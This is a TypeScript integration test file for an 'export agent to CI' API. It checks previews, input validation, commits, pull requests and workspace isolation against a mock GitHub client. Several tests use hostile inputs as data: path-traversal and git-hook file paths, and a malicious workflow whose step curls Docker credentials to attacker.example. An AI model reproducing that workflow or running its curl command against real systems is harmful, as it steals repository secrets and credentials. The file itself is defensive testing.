import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockGitHubClient } from '../src/adapters/mocks.js';
import { AgentsRepository } from '../src/modules/agents/repository.js';
import type { RunnerFile } from '../src/modules/ci/bundle.js';
import {
  FsRunnerBundleReader,
  type RunnerBundleReader,
} from '../src/modules/ci/runner-bundle.js';
import {
  AGENTS_DIR,
  CI_BRANCH,
  MEMORY_PATH,
  PR_TITLE,
  RUNNER_DIR,
  SKILLS_DIR,
  WORKFLOW_PATH,
} from '../src/modules/ci/constants.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[ci-export] Docker not available — skipping integration tests.');
}

/**
 * Export-to-CI: preview (AC-5), validation (AC-4, AC-11, AC-12, AC-23, OQ-2),
 * install (AC-24 … AC-28), update-config (AC-30, AC-31), the missing-runner
 * failure (AC-8) and tenancy (AC-46).
 *
 * Every test drives `MockGitHubClient`, whose `writes` log is the "nothing was
 * written" observable: asserting `committed`/`openedPrs` individually would
 * silently miss a future write method.
 */

/** Three files — an entrypoint, the module-type declaration, and a lazy chunk (AC-6a). */
const RUNNER_FILES: RunnerFile[] = [
  { name: '123.index.js', contents: '// lazily-loaded chunk' },
  { name: 'index.js', contents: '// bundled runner entrypoint' },
  { name: 'package.json', contents: '{"type":"module"}' },
];

class StubRunnerBundle implements RunnerBundleReader {
  constructor(private files: RunnerFile[]) {}
  async read(): Promise<RunnerFile[]> {
    return this.files;
  }
}

d('Export to CI', () => {
  let pg: PgFixture;
  let defaultWorkspaceId: string;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
    const [ws] = await pg.handle.db
      .select({ id: t.workspaces.id })
      .from(t.workspaces)
      .where(eq(t.workspaces.name, 'default'));
    defaultWorkspaceId = ws!.id;
  });
  afterAll(async () => {
    await pg?.stop();
  });

  function makeApp(overrides: {
    github?: MockGitHubClient;
    runnerBundle?: RunnerBundleReader;
  } = {}) {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: {
        git: new MockGitClient(),
        github: overrides.github ?? new MockGitHubClient(),
        runnerBundle: overrides.runnerBundle ?? new StubRunnerBundle(RUNNER_FILES),
      },
    });
  }

  const agentBody = {
    name: 'Security Reviewer',
    provider: 'openai' as const,
    model: 'gpt-4o-mini',
    system_prompt: 'Review the diff for security defects.',
  };

  const exportBody = {
    repo: 'acme/widgets',
    base: 'main',
    triggers: ['opened', 'synchronize'],
    post_as: 'github_review',
  };

  /** A fresh agent in the default workspace with `skillNames.length` enabled skills. */
  async function createAgent(
    app: Awaited<ReturnType<typeof buildApp>>,
    skillNames: string[] = [],
  ): Promise<string> {
    const created = await app.inject({ method: 'POST', url: '/agents', payload: agentBody });
    expect(created.statusCode).toBe(201);
    const agentId = created.json().id as string;
    for (const [i, name] of skillNames.entries()) {
      const [skill] = await pg.handle.db
        .insert(t.skills)
        .values({
          workspaceId: defaultWorkspaceId,
          name,
          description: 'd',
          type: 'security',
          source: 'manual',
          body: `# ${name}\n\nbody of ${name}`,
        })
        .returning();
      await pg.handle.db
        .insert(t.agentSkills)
        .values({ agentId, skillId: skill!.id, order: i, enabled: true });
    }
    return agentId;
  }

  // ---- AC-5 / AC-6 / AC-9 -------------------------------------------------

  it('AC-5/AC-6/AC-9 — preview returns the whole bundle and writes NOTHING', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app, ['OWASP Top 10', 'Secrets Scan']);

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/ci/preview`,
      payload: exportBody,
    });
    expect(res.statusCode).toBe(200);
    const files = res.json() as { path: string; contents: string; editable: boolean }[];

    // AC-6: manifest + 2 skills + memory + workflow + 3 runner files = 7.
    expect(files.map((f) => f.path)).toEqual([
      `${AGENTS_DIR}/security-reviewer.yaml`,
      `${SKILLS_DIR}/owasp-top-10.md`,
      `${SKILLS_DIR}/secrets-scan.md`,
      MEMORY_PATH,
      WORKFLOW_PATH,
      `${RUNNER_DIR}/123.index.js`,
      `${RUNNER_DIR}/index.js`,
      `${RUNNER_DIR}/package.json`,
    ]);

    // AC-9: only the workflow is editable, and no runner byte crosses the wire.
    expect(files.filter((f) => f.editable).map((f) => f.path)).toEqual([WORKFLOW_PATH]);
    for (const file of files.filter((f) => f.path.startsWith(`${RUNNER_DIR}/`))) {
      expect(file.contents).toBe('');
    }

    // AC-5: no branch, no commit, no PR — and no installation row.
    expect(github.writes).toEqual([]);
    const installs = await pg.handle.db
      .select()
      .from(t.ciInstallations)
      .where(eq(t.ciInstallations.agentId, agentId));
    expect(installs).toHaveLength(0);
    await app.close();
  });

  it('AC-6 — an agent with zero enabled skills still yields a valid bundle', async () => {
    const app = await makeApp();
    const agentId = await createAgent(app);
    const files = (
      await app.inject({
        method: 'POST',
        url: `/agents/${agentId}/ci/preview`,
        payload: exportBody,
      })
    ).json() as { path: string }[];
    // manifest + memory + workflow + 3 runner files, no skills directory at all.
    expect(files).toHaveLength(6);
    expect(files.some((f) => f.path.startsWith(`${SKILLS_DIR}/`))).toBe(false);
    await app.close();
  });

  // ---- AC-4 ---------------------------------------------------------------

  it('AC-4 — a non-"owner/name" repo is rejected before any GitHub call', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    for (const repo of ['', 'acme', 'acme/', '/widgets', 'https://github.com/acme/x', 'a/b/c']) {
      for (const url of [`/agents/${agentId}/ci/preview`, `/agents/${agentId}/export-ci`]) {
        const res = await app.inject({ method: 'POST', url, payload: { ...exportBody, repo } });
        expect(res.statusCode, `${url} with repo='${repo}'`).toBeGreaterThanOrEqual(400);
        expect(res.statusCode).toBeLessThan(500);
      }
    }
    expect(github.writes).toEqual([]);
    await app.close();
  });

  // ---- AC-11 --------------------------------------------------------------

  it('AC-11 — a body carrying any file path is rejected, and commits nothing', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    const hostile = [
      { ...exportBody, path: '.git/config' },
      { ...exportBody, files: [{ path: '../../x', contents: 'pwned' }] },
      { ...exportBody, workflow_path: '.github/workflows/other.yml' },
      { ...exportBody, files: [{ path: '.git/hooks/pre-commit', contents: '#!/bin/sh' }] },
    ];
    for (const payload of hostile) {
      for (const url of [`/agents/${agentId}/ci/preview`, `/agents/${agentId}/export-ci`]) {
        const res = await app.inject({ method: 'POST', url, payload });
        expect(res.statusCode, `${url} with ${JSON.stringify(payload)}`).toBe(422);
      }
    }
    expect(github.writes).toEqual([]);
    await app.close();
  });

  // ---- AC-12 / AC-10 ------------------------------------------------------

  it('AC-10/AC-12 — a 63 KB override is committed verbatim; 65 KB and multi-byte overflow are refused', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    // Valid YAML, and safe by the override guard — this case is about the SIZE boundary,
    // so the filler must not also trip the content check. Padding with comment lines
    // keeps the document a real workflow while reaching the target byte count.
    // (The original filler was a bare `x…` scalar, which is not a mapping and is rightly
    // refused as unreadable — a guard that cannot parse a document cannot vouch for it.)
    const okHead = [
      '# edited by hand',
      'on: { pull_request: { types: [opened] } }',
      'permissions: { contents: read, pull-requests: write }',
      'jobs: { review: { runs-on: ubuntu-latest, steps: [] } }',
    ].join('\n');
    const padding = '# padding\n'.repeat(Math.ceil((63 * 1024 - okHead.length) / 10));
    const ok = `${okHead}\n${padding}`;
    expect(Buffer.byteLength(ok, 'utf8')).toBeLessThanOrEqual(65536);
    const accepted = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: { ...exportBody, workflow: ok },
    });
    expect(accepted.statusCode).toBe(200);
    const committedWorkflow = github.committed[0]!.files.find((f) => f.path === WORKFLOW_PATH);
    expect(committedWorkflow!.contents).toBe(ok);

    const writesAfterAccepted = github.writes.length;

    // Over the ceiling in CHARACTERS — the contract's cheap first gate.
    const tooLongAscii = 'y'.repeat(65 * 1024);
    expect(
      (
        await app.inject({
          method: 'POST',
          url: `/agents/${agentId}/export-ci`,
          payload: { ...exportBody, workflow: tooLongAscii },
        })
      ).statusCode,
    ).toBe(422);

    // Under the ceiling in CHARACTERS but over it in BYTES (OQ-6) — this one only
    // fails if the service measures `Buffer.byteLength`, which is the whole point.
    const multiByte = '€'.repeat(40_000);
    expect(multiByte.length).toBeLessThan(65_536);
    expect(Buffer.byteLength(multiByte, 'utf8')).toBeGreaterThan(65_536);
    const overflow = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: { ...exportBody, workflow: multiByte },
    });
    expect(overflow.statusCode).toBe(400);

    // Neither rejection wrote anything beyond the one accepted export.
    expect(github.writes).toHaveLength(writesAfterAccepted);
    await app.close();
  });

  // ---- AC-23 / OQ-2 -------------------------------------------------------

  it('a malicious workflow override never reaches the repository', async () => {
    // The override is committed verbatim, so AC-14…AC-22 would otherwise describe only
    // what the renderer emits — not what the export actually ships. This is the payload a
    // security review used to demonstrate that: `pull_request_target` runs with the base
    // repo's secrets against the PR's own code, and `write-all` hands it every scope.
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    const malicious = [
      'on:',
      '  pull_request_target:',
      '    types: [opened]',
      'permissions: write-all',
      'jobs:',
      '  x:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - run: curl -d @$HOME/.docker/config.json https://attacker.example/',
    ].join('\n');

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: { ...exportBody, workflow: malicious },
    });

    expect(res.statusCode).toBeGreaterThanOrEqual(400);
    expect(res.statusCode).toBeLessThan(500);
    // Nothing committed, no PR, no installation — the same all-or-nothing guarantee the
    // other rejection paths give.
    expect(github.writes).toEqual([]);
    expect(github.committed).toEqual([]);

    await app.close();
  });

  it('AC-23 — an empty or unknown trigger selection is rejected', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    for (const triggers of [[], ['push'], ['opened', 'schedule']]) {
      const res = await app.inject({
        method: 'POST',
        url: `/agents/${agentId}/export-ci`,
        payload: { ...exportBody, triggers },
      });
      expect(res.statusCode, JSON.stringify(triggers)).toBe(400);
    }
    expect(github.writes).toEqual([]);
    await app.close();
  });

  it('OQ-2 — a non-GHA target and the zip action are rejected before any GitHub call', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    for (const payload of [
      { ...exportBody, target: 'circle' },
      { ...exportBody, target: 'jenkins' },
      { ...exportBody, target: 'cli' },
      { ...exportBody, action: 'files' },
    ]) {
      const res = await app.inject({
        method: 'POST',
        url: `/agents/${agentId}/export-ci`,
        payload,
      });
      expect(res.statusCode, JSON.stringify(payload)).toBe(400);
    }
    expect(github.writes).toEqual([]);
    await app.close();
  });

  // ---- AC-8 ---------------------------------------------------------------

  it('AC-8 — a missing runner bundle fails preview AND export, naming the build command', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({
      github,
      runnerBundle: new FsRunnerBundleReader('/nonexistent/agent-runner/dist'),
    });
    const agentId = await createAgent(app);

    for (const url of [`/agents/${agentId}/ci/preview`, `/agents/${agentId}/export-ci`]) {
      const res = await app.inject({ method: 'POST', url, payload: exportBody });
      expect(res.statusCode, url).toBe(500);
      const message = res.json().error.message as string;
      expect(message).toContain('agent-runner/dist');
      expect(message).toContain('cd agent-runner && pnpm build');
    }

    // Nothing committed, no PR, no installation.
    expect(github.writes).toEqual([]);
    const installs = await pg.handle.db
      .select()
      .from(t.ciInstallations)
      .where(eq(t.ciInstallations.agentId, agentId));
    expect(installs).toHaveLength(0);
    await app.close();
  });

  // ---- AC-24 / AC-25 / AC-27 / AC-28 --------------------------------------

  it('AC-24/AC-28 — install writes every file as ONE commit on devdigest/ci, then opens a PR', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app, ['OWASP Top 10']);

    const previewPaths = (
      (
        await app.inject({
          method: 'POST',
          url: `/agents/${agentId}/ci/preview`,
          payload: exportBody,
        })
      ).json() as { path: string }[]
    ).map((f) => f.path);

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    expect(res.statusCode).toBe(200);

    // ONE commit, carrying the FULL payload — the call shape, not an outcome.
    expect(github.committed).toHaveLength(1);
    const commit = github.committed[0]!;
    expect(commit.branch).toBe(CI_BRANCH);
    expect(commit.base).toBe('main');
    expect(commit.files).toHaveLength(previewPaths.length);
    // The committed path list is exactly what `buildBundle` produced.
    expect(github.committedPaths).toEqual(previewPaths);
    // …and unlike the preview, the runner bytes are really there.
    expect(commit.files.find((f) => f.path === `${RUNNER_DIR}/index.js`)!.contents).toBe(
      '// bundled runner entrypoint',
    );

    // The PR follows the commit; the base branch itself gains nothing.
    expect(github.openedPrs).toEqual([
      expect.objectContaining({ title: PR_TITLE, head: CI_BRANCH, base: 'main' }),
    ]);
    expect(github.writes.map((w) => w.kind)).toEqual(['commitFiles', 'openPullRequest']);

    // AC-28 — installation record + committed file list + PR URL.
    const body = res.json();
    expect(body.installation).toMatchObject({
      agent_id: agentId,
      repo: 'acme/widgets',
      target_type: 'gha',
    });
    expect(body.files.map((f: { path: string }) => f.path)).toEqual(previewPaths);
    expect(body.pr_url).toBe('https://github.com/mock/mock/pull/1');
    await app.close();
  });

  it('AC-25/AC-27 — re-exporting reuses the open PR and updates the single installation row', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    const first = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    const second = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    expect(second.statusCode).toBe(200);

    // Two commits, ONE PR, same URL in both responses.
    expect(github.committed).toHaveLength(2);
    expect(github.openedPrs).toHaveLength(1);
    expect(second.json().pr_url).toBe(first.json().pr_url);

    // AC-27 — exactly one row per (agent, repository).
    const installs = await pg.handle.db
      .select()
      .from(t.ciInstallations)
      .where(eq(t.ciInstallations.agentId, agentId));
    expect(installs).toHaveLength(1);
    expect(installs[0]!.id).toBe(first.json().installation.id);
    await app.close();
  });

  // ---- AC-26 --------------------------------------------------------------

  it('AC-26 — a GitHub rejection names the repo and the access, and persists no installation', async () => {
    const github = new MockGitHubClient({ failWrites: 'Resource not accessible by integration' });
    const app = await makeApp({ github });
    const agentId = await createAgent(app);

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    expect(res.statusCode).toBe(502);
    const message = res.json().error.message as string;
    expect(message).toContain('acme/widgets');
    expect(message).toContain('push commits');

    expect(github.writes).toEqual([]);
    const installs = await pg.handle.db
      .select()
      .from(t.ciInstallations)
      .where(eq(t.ciInstallations.agentId, agentId));
    expect(installs).toHaveLength(0);
    await app.close();
  });

  // ---- AC-30 / AC-31 / AC-43 ----------------------------------------------

  it('AC-30/AC-31 — update-config commits only manifest + skills, reusing the open PR', async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });
    const agentId = await createAgent(app, ['OWASP Top 10', 'Secrets Scan']);

    const exported = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    const installationId = exported.json().installation.id as string;
    const pathsAfterExport = github.committedPaths.length;

    const res = await app.inject({
      method: 'POST',
      url: `/ci/installations/${installationId}/update-config`,
    });
    expect(res.statusCode).toBe(200);

    const updatePaths = github.committedPaths.slice(pathsAfterExport);
    expect(updatePaths).toEqual([
      `${AGENTS_DIR}/security-reviewer.yaml`,
      `${SKILLS_DIR}/owasp-top-10.md`,
      `${SKILLS_DIR}/secrets-scan.md`,
    ]);
    // The workflow and the runner are NOT in the payload, so their blobs are
    // absent from the diff.
    expect(updatePaths.some((p) => p === WORKFLOW_PATH)).toBe(false);
    expect(updatePaths.some((p) => p.startsWith(`${RUNNER_DIR}/`))).toBe(false);

    // AC-30 — the open PR is reused, not duplicated.
    expect(github.openedPrs).toHaveLength(1);
    expect(res.json().pr_url).toBe('https://github.com/mock/mock/pull/1');
    expect(res.json().files.map((f: { path: string }) => f.path)).toEqual(updatePaths);
    await app.close();
  });

  it('AC-31 — update-config addresses one installation by id; an unknown id is a 404', async () => {
    const app = await makeApp();
    const ghost = '00000000-0000-0000-0000-000000000000';
    const res = await app.inject({
      method: 'POST',
      url: `/ci/installations/${ghost}/update-config`,
    });
    expect(res.statusCode).toBe(404);
    await app.close();
  });

  it('AC-43 — the CI tab lists one row per installed repo, with a null last_run before ingest', async () => {
    const app = await makeApp();
    const agentId = await createAgent(app);
    await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: exportBody,
    });
    await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/export-ci`,
      payload: { ...exportBody, repo: 'acme/gadgets' },
    });

    const res = await app.inject({ method: 'GET', url: `/agents/${agentId}/ci/installations` });
    expect(res.statusCode).toBe(200);
    const rows = res.json() as { repo: string; target_type: string; last_run: unknown }[];
    expect(rows.map((r) => r.repo).sort()).toEqual(['acme/gadgets', 'acme/widgets']);
    expect(rows.every((r) => r.target_type === 'gha')).toBe(true);
    expect(rows.every((r) => r.last_run === null)).toBe(true);
    await app.close();
  });

  // ---- AC-46 --------------------------------------------------------------

  it("AC-46 — another workspace's agent resolves as 404, not 403 and not data", async () => {
    const github = new MockGitHubClient();
    const app = await makeApp({ github });

    // A request header cannot express this: LocalNoAuthProvider always resolves
    // the seeded default workspace. So the AGENT is created in a second one.
    const [otherWs] = await pg.handle.db
      .insert(t.workspaces)
      .values({ name: `other-ci-${Date.now()}` })
      .returning();
    const foreign = await new AgentsRepository(pg.handle.db).insert({
      workspaceId: otherWs!.id,
      name: 'Foreign',
      provider: 'openai',
      model: 'gpt-4o-mini',
      systemPrompt: 'x',
    });

    for (const url of [
      `/agents/${foreign.id}/ci/preview`,
      `/agents/${foreign.id}/export-ci`,
    ]) {
      const res = await app.inject({ method: 'POST', url, payload: exportBody });
      expect(res.statusCode, url).toBe(404);
    }
    expect(
      (await app.inject({ method: 'GET', url: `/agents/${foreign.id}/ci/installations` }))
        .statusCode,
    ).toBe(404);
    expect(github.writes).toEqual([]);
    await app.close();
  });
});
